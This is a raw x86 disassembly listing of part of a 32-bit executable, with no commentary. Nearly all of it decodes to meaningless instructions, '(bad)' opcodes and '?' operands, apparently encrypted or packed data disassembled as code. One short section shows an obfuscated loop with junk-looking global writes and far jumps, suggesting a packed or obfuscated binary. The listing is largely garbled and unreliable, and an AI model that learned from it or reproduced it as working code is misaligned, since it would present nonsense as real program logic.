  40bc66:	ins    BYTE PTR es:[edi],dx
  40bc67:	arpl   WORD PTR [eax+0x43c244b9],ax
  40bc6d:	stos   DWORD PTR es:[edi],eax
  40bc6e:	push   ebx
  40bc6f:	xchg   ebx,eax
  40bc70:	jnp    0x40bbf2
  40bc72:	sub    DWORD PTR [edi],edx
  40bc74:	in     eax,0x6a
  40bc76:	adc    edi,DWORD PTR [esi+0x61cc08dc]
  40bc7c:	dec    edi
  40bc7d:	es sbb al,0x43
  40bc80:	lods   eax,DWORD PTR ds:[esi]
  40bc81:	js     0x40bcb1
  40bc83:	stos   BYTE PTR es:[edi],al
  40bc84:	adc    DWORD PTR [ebp-0x5aec0f32],esp
  40bc8a:	mov    ah,0x37
  40bc8c:	aaa    
  40bc8d:	mov    ecx,0xeed256a8
  40bc92:	sbb    bh,BYTE PTR [ebp+0x2f]
  40bc95:	mov    dl,0xd6
  40bc97:	or     al,0x94
  40bc99:	out    0x5,eax
  40bc9b:	test   DWORD PTR [bx-0x5e],edi
  40bc9f:	xchg   esp,eax
  40bca0:	xchg   ebp,eax
  40bca1:	xlat   BYTE PTR ds:[ebx]
  40bca2:	mov    dl,0x21
  40bca4:	not    ch
  40bca6:	or     dh,BYTE PTR [ecx-0xa]
  40bca9:	inc    eax
  40bcaa:	inc    edx
  40bcab:	clc    
  40bcac:	out    0x49,al
  40bcae:	test   BYTE PTR [edx+0x5cd1c026],ah
  40bcb4:	ins    BYTE PTR es:[edi],dx
  40bcb5:	sub    DWORD PTR [edx-0xb83b37d],0x3fa92c71
  40bcbf:	push   edi
  40bcc0:	xchg   BYTE PTR [eax+0x5e6bdd70],cl
  40bcc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bcc7:	mov    al,0x39
  40bcc9:	neg    DWORD PTR [edx+eax*8-0x4cab0113]
  40bcd0:	cwde   
  40bcd1:	pop    ds
  40bcd2:	pusha  
  40bcd3:	push   edx
  40bcd4:	mov    al,0xc1
  40bcd6:	shl    DWORD PTR [edi-0x24],0x90
  40bcda:	shl    edi,cl
  40bcdc:	lods   al,BYTE PTR ds:[esi]
  40bcdd:	fidivr WORD PTR [ebx+esi*4-0x12]
  40bce1:	pop    ss
  40bce2:	loope  0x40bc6b
  40bce4:	pop    edi
  40bce5:	dec    ecx
  40bce6:	lss    edx,FWORD PTR [esi-0x76]
  40bcea:	push   esi
  40bceb:	fsin   
  40bced:	(bad)  
  40bcee:	aas    
  40bcef:	inc    ecx
  40bcf0:	dec    edx
  40bcf1:	lods   al,BYTE PTR ds:[esi]
  40bcf2:	or     DWORD PTR [ebp-0x71],ebp
  40bcf5:	push   edx
  40bcf6:	xchg   ebp,eax
  40bcf7:	inc    ebx
  40bcf8:	(bad)  [esi+0x6d]
  40bcfb:	aad    0x76
  40bcfd:	imul   ecx,DWORD PTR [eax-0x1f],0x9
  40bd01:	xchg   edi,eax
  40bd02:	lea    ebp,[ebp+0x184c6983]
  40bd08:	imul   esi,DWORD PTR cs:[edx-0x5352df40],0xace472e3
  40bd13:	std    
  40bd14:	jecxz  0x40bd13
  40bd16:	ret    
  40bd17:	(bad)  
  40bd18:	(bad)  
  40bd19:	out    0xa,al
  40bd1b:	inc    ebx
  40bd1c:	icebp  
  40bd1d:	icebp  
  40bd1e:	leave  
  40bd1f:	int    0x8a
  40bd21:	cmp    esi,DWORD PTR [eax-0x3f]
  40bd24:	and    DWORD PTR [ebp+0x435aa12c],ebp
  40bd2a:	inc    ebx
  40bd2b:	ds inc eax
  40bd2d:	push   0xffffffd7
  40bd2f:	sbb    BYTE PTR gs:0x616f98b6,ah
  40bd36:	test   DWORD PTR [ebp+0xc],eax
  40bd39:	dec    ebp
  40bd3a:	dec    edx
  40bd3b:	pop    ecx
  40bd3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd3d:	mov    WORD PTR [edi+0x18790acd],ss
  40bd43:	inc    BYTE PTR [ebx+0x3d]
  40bd46:	mov    ebx,0x760795c4
  40bd4b:	in     eax,dx
  40bd4c:	add    DWORD PTR [edi],ecx
  40bd4e:	call   0x752:0xf1bc304f
  40bd55:	pushf  
  40bd56:	jo     0x40bd0e
  40bd58:	jmp    0x40bd05
  40bd5a:	push   ebp
  40bd5b:	cli    
  40bd5c:	push   cs
  40bd5d:	xor    esi,ecx
  40bd5f:	aad    0xc8
  40bd61:	pop    ss
  40bd62:	mov    bl,0x32
  40bd64:	add    BYTE PTR [edi-0xc],ah
  40bd67:	leave  
  40bd68:	lock add DWORD PTR [ebx+0x31],ebx
  40bd6c:	ins    DWORD PTR es:[edi],dx
  40bd6d:	aas    
  40bd6e:	push   0x35d5319d
  40bd73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd74:	dec    ecx
  40bd75:	and    DWORD PTR [esi+0x29c7809d],ebx
  40bd7b:	out    dx,al
  40bd7c:	loop   0x40bd3d
  40bd7e:	shl    BYTE PTR [eax-0xc],cl
  40bd81:	xor    DWORD PTR [ecx],0xffffffc1
  40bd84:	add    ecx,DWORD PTR [edi]
  40bd86:	cli    
  40bd87:	xor    ecx,DWORD PTR [ebp-0x2c4a7e5d]
  40bd8d:	and    BYTE PTR [ecx],bl
  40bd8f:	xor    ah,BYTE PTR [esi+eax*4]
  40bd92:	jbe    0x40bda5
  40bd94:	mov    ecx,0xeab04ac5
  40bd99:	jbe    0x40bdb6
  40bd9b:	test   eax,0xb22ffcf1
  40bda0:	mov    ds,WORD PTR [edi+edx*4-0x2f798a63]
  40bda7:	add    edx,ebx
  40bda9:	aas    
  40bdaa:	ds push ebp
  40bdac:	mov    gs,eax
  40bdae:	fimul  DWORD PTR [edx+0x34dd458d]
  40bdb4:	sti    
  40bdb5:	(bad)  
  40bdb6:	pop    ebx
  40bdb7:	pop    ecx
  40bdb8:	je     0x40bd77
  40bdba:	sbb    DWORD PTR ds:0x7ae512fc,esp
  40bdc0:	inc    edi
  40bdc1:	and    ch,BYTE PTR [edx-0x42701fb8]
  40bdc7:	loop   0x40bd73
  40bdc9:	xor    ebp,DWORD PTR [ecx-0x3c]
  40bdcc:	(bad)  
  40bdcd:	daa    
  40bdce:	jae    0x40bd56
  40bdd0:	pop    ds
  40bdd1:	push   esi
  40bdd2:	out    0x39,al
  40bdd4:	fs retf 0xcaac
  40bdd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdd9:	pop    eax
  40bdda:	jno    0x40bddb
  40bddc:	popf   
  40bddd:	(bad)  [ebp-0x4a4b9a44]
  40bde3:	jl     0x40bdf3
  40bde5:	ss xchg esi,eax
  40bde7:	ret    
  40bde8:	dec    esp
  40bde9:	scas   eax,DWORD PTR es:[edi]
  40bdea:	mov    DWORD PTR ds:0x21824d59,esi
  40bdf0:	mov    DWORD PTR [ebx-0x63484185],ebp
  40bdf6:	push   eax
  40bdf7:	loop   0x40be16
  40bdf9:	cmp    DWORD PTR [ebx+0x59c0241f],ebx
  40bdff:	push   ds
  40be00:	daa    
  40be01:	and    DWORD PTR [esi-0x1b336dc9],ecx
  40be07:	cmp    BYTE PTR [esi],0x74
  40be0a:	outs   dx,DWORD PTR ds:[esi]
  40be0b:	iret   
  40be0c:	add    al,0x31
  40be0e:	push   0xa703bd7c
  40be13:	inc    ecx
  40be14:	xor    dl,bl
  40be16:	push   ecx
  40be17:	(bad)  
  40be18:	and    eax,0x65f81018
  40be1d:	daa    
  40be1e:	push   cs
  40be1f:	xchg   esi,eax
  40be20:	inc    ebp
  40be21:	mov    edx,0x4c69a8f4
  40be26:	mov    esi,0xd7ee5bb2
  40be2b:	test   esi,ecx
  40be2d:	(bad)  
  40be2f:	mov    bh,0x1
  40be31:	and    dl,BYTE PTR [ebx]
  40be33:	cld    
  40be34:	pop    ss
  40be35:	gs pushf 
  40be37:	inc    edx
  40be38:	adc    eax,0x3c1034ee
  40be3d:	jmp    FWORD PTR [ecx]
  40be3f:	bound  esi,QWORD PTR [ecx]
  40be41:	ret    
  40be42:	jns    0x40be6f
  40be44:	pusha  
  40be45:	sar    BYTE PTR [ebp+0x59],cl
  40be48:	jb     0x40be82
  40be4a:	sub    ebp,DWORD PTR [ecx-0x6416ac6]
  40be50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be51:	(bad)  
  40be52:	jns    0x40be08
  40be54:	(bad)  
  40be55:	fmul   DWORD PTR [edi-0x21]
  40be58:	sahf   
  40be59:	dec    eax
  40be5a:	int3   
  40be5b:	sub    al,0x32
  40be5d:	push   ss
  40be5e:	dec    eax
  40be5f:	outs   dx,BYTE PTR ds:[esi]
  40be60:	out    dx,eax
  40be61:	jnp    0x40beb2
  40be63:	sub    ah,BYTE PTR [eax]
  40be65:	mov    cl,0xe2
  40be67:	inc    ecx
  40be68:	shl    DWORD PTR [edx+0x3f65cfc3],0xa
  40be6f:	ror    DWORD PTR [eax-0x19],1
  40be72:	or     dh,0xf8
  40be75:	in     al,dx
  40be76:	pop    ecx
  40be77:	mov    bh,0xee
  40be79:	jne    0x40be09
  40be7b:	and    BYTE PTR [esi-0x4b],dl
  40be7e:	retf   0xcab4
  40be81:	cmp    al,0x62
  40be83:	mov    bl,0xbd
  40be85:	mov    gs,WORD PTR [edi]
  40be87:	add    DWORD PTR [edi-0x29],0xc2963d18
  40be8e:	dec    edx
  40be8f:	push   ebp
  40be90:	adc    bl,BYTE PTR [ebx]
  40be92:	(bad)  
  40be93:	pop    eax
  40be94:	aaa    
  40be95:	popf   
  40be96:	pop    esp
  40be97:	scas   eax,DWORD PTR es:[edi]
  40be98:	push   ecx
  40be99:	jb     0x40bf13
  40be9b:	xchg   ecx,eax
  40be9c:	xor    DWORD PTR [ebp-0x7b],edi
  40be9f:	stos   BYTE PTR es:[edi],al
  40bea0:	or     DWORD PTR [edx],ebp
  40bea2:	fisttp DWORD PTR ds:0xde2cda1c
  40bea8:	std    
  40bea9:	icebp  
  40beaa:	test   BYTE PTR [edi-0x45dee58b],al
  40beb0:	mov    edi,DWORD PTR [ebp+0x8]
  40beb3:	mov    eax,ds:0x424435
  40beb8:	mov    DWORD PTR ds:0x420e9e,0x18
  40bec2:	cmp    DWORD PTR ds:0x420e9e,0x0
  40bec9:	je     0x40bf28
  40becf:	cmp    DWORD PTR ds:0x420e9e,0x8
  40bed6:	jne    0x40befa
  40bedc:	push   DWORD PTR [ebp-0xc]
  40bedf:	push   0x420e7e
  40bee4:	push   0x29f3
  40bee9:	push   0x424044
  40beee:	push   DWORD PTR [ebp-0x18]
  40bef1:	push   DWORD PTR [ebp-0x24]
  40bef4:	call   DWORD PTR ds:0x42480d
  40befa:	cmp    DWORD PTR ds:0x420e9e,0x9
  40bf01:	jne    0x40bf16
  40bf07:	xor    edx,edx
  40bf09:	xor    edx,DWORD PTR ds:0x420e9e
  40bf0f:	dec    edx
  40bf10:	mov    DWORD PTR ds:0x420e9e,edx
  40bf16:	mov    edx,DWORD PTR ds:0x420e9e
  40bf1c:	dec    edx
  40bf1d:	mov    DWORD PTR ds:0x420e9e,edx
  40bf23:	jmp    0x40bec2
  40bf28:	mov    eax,DWORD PTR [eax+0x198]
  40bf2e:	or     DWORD PTR ds:0x422010,edx
  40bf34:	xor    edi,ecx
  40bf36:	xor    DWORD PTR ds:0x420f00,edx
  40bf3c:	mov    edx,0x3272dd
  40bf41:	or     DWORD PTR ds:0x420f08,0x420e96
  40bf4b:	add    edi,edx
  40bf4d:	mov    DWORD PTR ds:0x420e8e,0x537
  40bf57:	cmp    DWORD PTR [eax],edi
  40bf59:	je     0x40bf70
  40bf5f:	mov    DWORD PTR ds:0x420f08,0x7795
  40bf69:	mov    eax,DWORD PTR [eax]
  40bf6b:	jmp    0x410a15
  40bf70:	mov    DWORD PTR ds:0x420fb4,0x165d
  40bf7a:	mov    eax,DWORD PTR [ebp+0x18]
  40bf7d:	cmp    eax,esi
  40bf7f:	mov    DWORD PTR ds:0x420eec,0x5796
  40bf89:	jne    0x40bf99
  40bf8f:	push   0xf89c85b2
  40bf94:	jmp    0x410a04
  40bf99:	mov    esi,DWORD PTR [ebp+0x18]
  40bf9c:	mov    eax,0xf89c85b3
  40bfa1:	mov    DWORD PTR ds:0x420e96,0x5b0e
  40bfab:	cmp    esi,eax
  40bfad:	jne    0x4109f4
  40bfb3:	mov    eax,ds:0x420ea2
  40bfb8:	or     eax,DWORD PTR ds:0x420ef4
  40bfbe:	mov    ds:0x420ea2,eax
  40bfc3:	mov    eax,DWORD PTR [ebp+0x10]
  40bfc6:	xor    eax,ecx
  40bfc8:	sub    DWORD PTR ds:0x420e96,0x168d
  40bfd2:	add    eax,edx
  40bfd4:	mov    esi,DWORD PTR ds:0x420ef4
  40bfda:	and    DWORD PTR ds:0x420f5c,esi
  40bfe0:	mov    DWORD PTR [ebp-0x18],eax
  40bfe3:	neg    esi
  40bfe5:	mov    eax,DWORD PTR [ebp+0xc]
  40bfe8:	mov    esi,DWORD PTR [ebp-0x8]
  40bfeb:	xor    DWORD PTR ds:0x420f00,0x766d
  40bff5:	xor    eax,ecx
  40bff7:	sbb    DWORD PTR ds:0x420e86,0x420e8a
  40c001:	jmp    0x40e37b
  40c006:	push   ebp
  40c007:	mov    ds:0xbb7be978,al
  40c00c:	not    DWORD PTR [esi+0x4b1ebfc]
  40c012:	pop    ecx
  40c013:	fdiv   QWORD PTR [ecx]
  40c015:	retf   
  40c016:	aam    0xe9
  40c018:	jp     0x40c094
  40c01a:	sbb    DWORD PTR [edi+0x7a],ebx
  40c01d:	jp     0x40c017
  40c01f:	pop    ss
  40c020:	inc    esi
  40c021:	xor    BYTE PTR [ebp-0x2a87e7c8],0x2a
  40c028:	xor    eax,0xb76a9222
  40c02d:	mov    ds,WORD PTR [ebx-0x34]
  40c030:	pushf  
  40c031:	mov    edx,?
  40c033:	cdq    
  40c034:	cmp    BYTE PTR [eax-0x4f45250f],dl
  40c03a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c03b:	add    bh,BYTE PTR [esi+0x4e65ab1]
  40c041:	sbb    dl,BYTE PTR [ebx]
  40c043:	rcr    dh,0x15
  40c046:	xchg   BYTE PTR [ecx+0x4b701af2],ah
  40c04c:	ret    
  40c04d:	jo     0x40bff8
  40c04f:	inc    DWORD PTR [eax-0x41]
  40c052:	xchg   ebp,eax
  40c053:	add    BYTE PTR [eax-0x57067eba],bl
  40c059:	xor    DWORD PTR [edi],esi
  40c05b:	sahf   
  40c05c:	cli    
  40c05d:	pop    ss
  40c05e:	jnp    0x40c0a9
  40c060:	adc    ecx,DWORD PTR [ebp-0x52]
  40c063:	ins    DWORD PTR es:[edi],dx
  40c064:	mov    al,0xb3
  40c066:	test   eax,0xed4dcc11
  40c06b:	sbb    al,0xba
  40c06d:	int3   
  40c06e:	mov    DWORD PTR [edx+0x1],ebp
  40c071:	jnp    0x40c045
  40c073:	jl     0x40c0d0
  40c075:	mov    bl,0xe6
  40c077:	add    eax,0x369c5177
  40c07c:	sub    ebp,DWORD PTR ds:0xd0405cf4
  40c082:	sbb    ebp,ebp
  40c084:	xor    BYTE PTR [edx-0x33],al
  40c087:	lea    esp,[edx-0x58ab2547]
  40c08d:	pop    edi
  40c08e:	mov    ?,eax
  40c090:	sti    
  40c091:	clflush BYTE PTR ds:0x53f1e926
  40c098:	push   ecx
  40c099:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c09a:	mov    ch,0x7d
  40c09c:	test   eax,esi
  40c09e:	retf   
  40c09f:	stos   BYTE PTR es:[edi],al
  40c0a0:	mov    esp,DWORD PTR [ecx+0x6d]
  40c0a3:	pusha  
  40c0a4:	and    esi,DWORD PTR [ecx-0x6a]
  40c0a7:	adc    DWORD PTR cs:[edi],ecx
  40c0aa:	jns    0x40c0ab
  40c0ac:	adc    ebx,esi
  40c0ae:	ds jmp 0x6b91bbf7
  40c0b4:	mov    eax,0x3b96a113
  40c0b9:	or     esi,edx
  40c0bb:	or     al,0xec
  40c0bd:	xor    eax,ebp
  40c0bf:	cmp    eax,0x4577d72f
  40c0c4:	cdq    
  40c0c5:	repz or eax,DWORD PTR [ecx-0x214b8f91]
  40c0cc:	add    ch,ah
  40c0ce:	imul   ecx,DWORD PTR ds:0xf6e2a4b3,0x7872b01a
  40c0d8:	lock popw es
  40c0db:	xchg   ebx,eax
  40c0dc:	std    
  40c0dd:	int3   
  40c0de:	fiadd  DWORD PTR [ebp+0x7057530f]
  40c0e4:	ja     0x40c134
  40c0e6:	(bad)  
  40c0e8:	in     eax,dx
  40c0e9:	repz inc esi
  40c0eb:	dec    BYTE PTR [esi-0x43]
  40c0ee:	mov    ah,0x20
  40c0f0:	loop   0x40c15a
  40c0f2:	shr    BYTE PTR [ebx+0x2d],1
  40c0f5:	mov    esi,0xa1348f0
  40c0fa:	cdq    
  40c0fb:	add    BYTE PTR [ebx],dl
  40c0fd:	jbe    0x40c158
  40c0ff:	(bad)  
  40c100:	jmp    0x40c136
  40c102:	cld    
  40c103:	nop
  40c104:	push   edi
  40c105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c106:	xlat   BYTE PTR ds:[ebx]
  40c107:	and    ecx,edx
  40c109:	jecxz  0x40c0af
  40c10b:	rcl    BYTE PTR [esi-0x15ce0460],1
  40c111:	out    0x1e,al
  40c113:	es or  dh,ah
  40c116:	jecxz  0x40c11e
  40c118:	push   ebp
  40c119:	ins    BYTE PTR es:[edi],dx
  40c11a:	outs   dx,DWORD PTR ds:[esi]
  40c11b:	scas   eax,DWORD PTR es:[edi]
  40c11c:	(bad)  
  40c11d:	(bad)  
  40c11e:	aaa    
  40c11f:	mov    cl,0x78
  40c121:	add    ebp,edi
  40c123:	dec    edx
  40c124:	fild   DWORD PTR [edi]
  40c126:	and    DWORD PTR [edx-0x5ff00520],ebp
  40c12c:	loop   0x40c185
  40c12e:	aas    
  40c12f:	test   cl,al
  40c131:	adc    eax,0x6994a48c
  40c136:	add    eax,0xae30820
  40c13b:	add    al,0x3e
  40c13d:	inc    esp
  40c13e:	jmp    FWORD PTR [ecx]
  40c140:	dec    edx
  40c141:	cmp    BYTE PTR [eax-0x3a153c91],ch
  40c147:	xor    eax,eax
  40c149:	cmp    DWORD PTR [ebp+0x44512d07],esi
  40c14f:	push   edx
  40c150:	lods   al,BYTE PTR ds:[esi]
  40c151:	sbb    cl,dh
  40c153:	push   ss
  40c154:	xchg   edx,eax
  40c155:	out    0x61,eax
  40c157:	push   es
  40c158:	cdq    
  40c159:	repz pop edi
  40c15b:	cmp    BYTE PTR [edi+0x389c6f9],bh
  40c161:	sbb    al,0xc3
  40c163:	es push ecx
  40c165:	push   edi
  40c166:	aas    
  40c167:	dec    ebx
  40c168:	gs fucomip st,st(3)
  40c16b:	sbb    ebp,DWORD PTR [ebx-0x6fd217ec]
  40c171:	push   ebx
  40c172:	and    dh,BYTE PTR [edx-0x333f75af]
  40c178:	pop    es
  40c179:	test   BYTE PTR [edi+eax*8],dl
  40c17c:	sahf   
  40c17d:	inc    eax
  40c17e:	push   edx
  40c17f:	inc    DWORD PTR [esi+eiz*2+0x5124ed89]
  40c186:	fisttp WORD PTR [ebp-0x38]
  40c189:	mov    ecx,0xd12f0dbe
  40c18e:	jecxz  0x40c15d
  40c190:	movlps xmm5,QWORD PTR [eax]
  40c193:	ror    bh,cl
  40c195:	mov    esp,0xa1a5fa6d
  40c19a:	adc    bh,bh
  40c19c:	and    al,0x45
  40c19e:	jmp    0xd8d0:0x8b9134e4
  40c1a5:	out    0x4e,al
  40c1a7:	xchg   BYTE PTR [ecx-0x38],bh
  40c1aa:	and    bh,BYTE PTR [edx+0x4aaba769]
  40c1b0:	push   ebx
  40c1b1:	inc    eax
  40c1b2:	cmp    eax,edx
  40c1b4:	ret    0xaddd
  40c1b7:	cmp    DWORD PTR [ecx+0x1455e59a],0xe5d3778e
  40c1c1:	adc    al,0xd3
  40c1c3:	(bad)  
  40c1c4:	mov    edi,0x4aa6e4d6
  40c1c9:	inc    ebp
  40c1ca:	cs push ds
  40c1cc:	loopne 0x40c214
  40c1ce:	adc    DWORD PTR [esi+0x30],edx
  40c1d1:	ins    BYTE PTR es:[edi],dx
  40c1d2:	rcl    DWORD PTR [edx-0xf],1
  40c1d5:	shl    DWORD PTR [ebx-0x1522f95d],1
  40c1db:	jne    0x40c20c
  40c1dd:	add    ebp,DWORD PTR [edx+0x1a6d4881]
  40c1e3:	lock neg al
  40c1e6:	or     al,al
  40c1e8:	dec    edx
  40c1e9:	inc    edi
  40c1ea:	sbb    DWORD PTR [eax+eiz*2+0x4c5148b9],ebx
  40c1f1:	jl     0x40c229
  40c1f3:	or     dl,BYTE PTR [esi+eiz*2]
  40c1f6:	sti    
  40c1f7:	mov    eax,0xe73dee07
  40c1fc:	(bad)  
  40c1fd:	loope  0x40c220
  40c1ff:	scas   eax,DWORD PTR es:[edi]
  40c200:	mov    ah,0xd1
  40c202:	pop    esp
  40c203:	arpl   WORD PTR [ecx+0x13],bp
  40c206:	mov    al,0xd4
  40c208:	aad    0x6e
  40c20a:	fnstsw WORD PTR [ebp+ebp*8+0x43]
  40c20e:	ja     0x40c264
  40c210:	xchg   edx,eax
  40c211:	add    eax,0x6671cf5c
  40c216:	stc    
  40c217:	loope  0x40c25d
  40c219:	rcl    DWORD PTR [edi-0x5],cl
  40c21c:	ds icebp 
  40c21e:	inc    esp
  40c21f:	fisttp WORD PTR es:[ebp+0x412c2c2]
  40c226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c227:	push   es
  40c228:	cmp    BYTE PTR [ecx+edi*4-0x4],cl
  40c22c:	addr16 iret 
  40c22e:	icebp  
  40c22f:	xchg   dl,bh
  40c231:	sahf   
  40c232:	adc    ebp,esi
  40c234:	jmp    DWORD PTR [edx+0x17797967]
  40c23a:	xchg   ebx,eax
  40c23b:	pop    edx
  40c23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c23d:	neg    ecx
  40c23f:	fadd   DWORD PTR [eax+edi*2]
  40c242:	(bad)  
  40c243:	jne    0x40c23a
  40c245:	call   0x67:0x320f340
  40c24c:	jg     0x40c28f
  40c24e:	sbb    al,ch
  40c250:	out    dx,al
  40c251:	(bad)  
  40c252:	push   edx
  40c253:	xchg   BYTE PTR [ecx+edx*4+0x45],cl
  40c257:	mov    edx,0x4e91ca6d
  40c25c:	mov    DWORD PTR [ebx+0x37],ebp
  40c25f:	mov    ebx,0x6962b5bd
  40c264:	repnz inc ebp
  40c266:	addr16 sub edi,ecx
  40c269:	mov    eax,edx
  40c26b:	fs jmp 0x71eaf2a3
  40c271:	push   ss
  40c272:	iret   
  40c273:	and    eax,0xab03eb06
  40c278:	lock ds aam 0x3d
  40c27c:	retfw  0x3d23
  40c280:	sbb    DWORD PTR [edi+0x39],0x2
  40c284:	out    0x58,eax
  40c286:	add    al,0x67
  40c288:	mov    al,0x6e
  40c28a:	dec    ecx
  40c28b:	pop    ecx
  40c28c:	aaa    
  40c28d:	mov    ch,0xa0
  40c28f:	push   ebx
  40c290:	cmp    esi,DWORD PTR [edi+0x66]
  40c293:	fisub  DWORD PTR [ecx-0x6a]
  40c296:	dec    esp
  40c297:	pop    edx
  40c298:	mov    dh,0x6e
  40c29a:	leave  
  40c29b:	bound  ecx,QWORD PTR [ebp-0x14]
  40c29e:	sub    al,0xa2
  40c2a0:	push   eax
  40c2a1:	mov    ecx,0x7d5c9358
  40c2a6:	or     eax,0xead28b2c
  40c2ab:	loopne 0x40c23b
  40c2ad:	or     DWORD PTR [ecx-0x21a8db0],edx
  40c2b3:	mov    al,dl
  40c2b5:	sbb    eax,0x3084ccc5
  40c2ba:	in     al,dx
  40c2bb:	retf   0xa6bd
  40c2be:	out    0x16,eax
  40c2c0:	cmp    edi,ecx
  40c2c2:	rcl    BYTE PTR [esi-0x5e],cl
  40c2c5:	add    cl,bh
  40c2c7:	sub    al,0x5c
  40c2c9:	ror    BYTE PTR [eax+0x616bc13a],1
  40c2cf:	adc    BYTE PTR [ebx+0x4a],0x33
  40c2d3:	into   
  40c2d4:	outs   dx,DWORD PTR ds:[esi]
  40c2d5:	xchg   esp,eax
  40c2d6:	cli    
  40c2d7:	imul   ecx,DWORD PTR [esi+0x7c],0xffffff94
  40c2db:	fld    TBYTE PTR [esi-0x27]
  40c2de:	(bad)  
  40c2df:	sub    cl,al
  40c2e1:	das    
  40c2e2:	gs js  0x40c2ac
  40c2e5:	adc    ah,ah
  40c2e7:	and    bh,BYTE PTR [ecx]
  40c2e9:	daa    
  40c2ea:	loop   0x40c36a
  40c2ec:	and    esi,esi
  40c2ee:	sbb    al,0x40
  40c2f0:	leave  
  40c2f1:	mov    dl,0xe7
  40c2f3:	inc    esi
  40c2f4:	je     0x40c2e1
  40c2f6:	sub    DWORD PTR [eax-0x2ebd6586],ebx
  40c2fc:	inc    ebp
  40c2fd:	fsubp  st(2),st
  40c2ff:	outs   dx,DWORD PTR ds:[esi]
  40c300:	mov    bh,dh
  40c302:	pop    edi
  40c303:	int3   
  40c304:	retf   
  40c305:	test   edx,esi
  40c307:	popa   
  40c308:	push   0xffffffea
  40c30a:	inc    edx
  40c30b:	mov    BYTE PTR [ecx],dl
  40c30d:	and    dh,bl
  40c30f:	int3   
  40c310:	inc    eax
  40c311:	jns    0x40c2b0
  40c313:	sub    al,0x71
  40c315:	jg     0x40c38f
  40c317:	pop    es
  40c318:	push   ebx
  40c319:	test   DWORD PTR [eax-0x4c2a1c16],edx
  40c31f:	loopne 0x40c2ab
  40c321:	stos   BYTE PTR es:[edi],al
  40c322:	or     BYTE PTR [edi-0x4b],ah
  40c325:	and    al,0xcb
  40c327:	(bad)  
  40c328:	stos   DWORD PTR es:[edi],eax
  40c329:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c32a:	aas    
  40c32b:	mov    bh,0x6b
  40c32d:	pop    DWORD PTR [ecx-0x87b2dc]
  40c333:	mov    edx,gs
  40c335:	or     edi,DWORD PTR [edx+edx*4]
  40c338:	jl     0x40c360
  40c33a:	pop    ds
  40c33b:	sar    BYTE PTR [esi+0x4f],0xc1
  40c33f:	jl     0x40c36c
  40c341:	mov    ebp,0x36a226a6
  40c346:	and    ch,BYTE PTR [ecx+esi*4+0x4e5d9a76]
  40c34d:	fs cmc 
  40c34f:	and    BYTE PTR [ebp+edx*4-0x7bedbc82],cl
  40c356:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c357:	clc    
  40c358:	inc    esp
  40c359:	mov    cl,0xac
  40c35b:	sbb    esp,ebp
  40c35d:	pop    ecx
  40c35e:	sbb    al,0x36
  40c360:	mov    WORD PTR [edi-0x41],?
  40c363:	push   cs
  40c364:	pop    ds
  40c365:	sbb    al,0xd3
  40c367:	inc    ebp
  40c368:	(bad)  
  40c369:	jae    0x40c3e0
  40c36b:	xchg   BYTE PTR [esi-0x3948ea7],dl
  40c371:	out    dx,eax
  40c372:	les    edx,FWORD PTR [esp+ecx*8+0x51]
  40c376:	pop    ss
  40c377:	aad    0xa2
  40c379:	stos   BYTE PTR es:[edi],al
  40c37a:	pop    ss
  40c37b:	int3   
  40c37c:	clc    
  40c37d:	push   eax
  40c37e:	iret   
  40c37f:	mov    BYTE PTR [edx],bh
  40c381:	push   esp
  40c382:	dec    ebp
  40c383:	mov    ecx,0xf8b43e0f
  40c388:	es push esp
  40c38a:	outs   dx,DWORD PTR ds:[esi]
  40c38b:	jmp    0x40c3d7
  40c38d:	inc    esp
  40c38e:	mov    edi,0x288f1207
  40c393:	jbe    0x40c389
  40c395:	pop    ds
  40c396:	dec    esi
  40c397:	sbb    ebp,0x34
  40c39a:	pop    es
  40c39b:	sar    BYTE PTR [edi+0x4b],0x61
  40c39f:	xchg   esi,eax
  40c3a0:	mov    al,ds:0x27a2ca38
  40c3a5:	jg     0x40c3e5
  40c3a7:	mov    esp,0x15f46fcb
  40c3ac:	dec    ebx
  40c3ad:	xor    ecx,DWORD PTR [ebx-0x12]
  40c3b0:	scas   al,BYTE PTR es:[edi]
  40c3b1:	jle    0x40c34b
  40c3b3:	fcomp  QWORD PTR [ebx]
  40c3b5:	test   DWORD PTR [ebx+0x70],ebx
  40c3b8:	ds loopne 0x40c384
  40c3bb:	lahf   
  40c3bc:	mov    esp,0xbba8b0ea
  40c3c1:	adc    BYTE PTR [ebx],al
  40c3c3:	xor    al,BYTE PTR [eax+0x1fc204a8]
  40c3c9:	cdq    
  40c3ca:	rol    DWORD PTR [ebx+ecx*1-0x13b4a55f],0x83
  40c3d2:	push   es
  40c3d3:	add    dh,dl
  40c3d5:	xchg   ecx,eax
  40c3d6:	scas   eax,DWORD PTR es:[edi]
  40c3d7:	outs   dx,DWORD PTR ds:[esi]
  40c3d8:	mov    ch,0x9e
  40c3da:	inc    ebp
  40c3db:	dec    esi
  40c3dc:	test   al,0x3e
  40c3de:	out    0x4c,eax
  40c3e0:	cld    
  40c3e1:	adc    al,0xb9
  40c3e3:	inc    edx
  40c3e4:	xchg   ecx,ecx
  40c3e6:	sbb    eax,edx
  40c3e8:	xchg   edx,eax
  40c3e9:	push   DWORD PTR [ebx]
  40c3eb:	repz (bad) 
  40c3ef:	inc    esi
  40c3f0:	cmp    eax,0x6115d7bd
  40c3f5:	jbe    0x40c385
  40c3f7:	add    eax,0x5d2f5f1e
  40c3fc:	xchg   edx,eax
  40c3fd:	outs   dx,BYTE PTR ds:[esi]
  40c3fe:	rol    ebp,1
  40c400:	push   edx
  40c401:	(bad)  
  40c402:	pusha  
  40c403:	or     DWORD PTR [ecx+esi*8-0x70],ebp
  40c407:	seta   BYTE PTR [ebp+0x4671abf6]
  40c40e:	test   BYTE PTR [ebp+0x1c],bl
  40c411:	(bad)  
  40c412:	clc    
